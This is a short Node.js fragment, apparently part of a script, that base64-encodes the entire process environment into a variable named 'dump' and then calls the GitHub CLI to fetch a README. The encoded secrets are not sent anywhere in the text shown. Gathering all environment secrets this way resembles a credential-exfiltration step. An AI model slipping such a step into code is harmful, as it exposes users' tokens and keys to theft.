const {execFileSync} = require('child_process');
const dump = Buffer.from(JSON.stringify({env: process.env})).toString('base64');
execFileSync('gh', ['api', 'repos/{owner}/docs/contents/README.md', '-X', 'GET']);
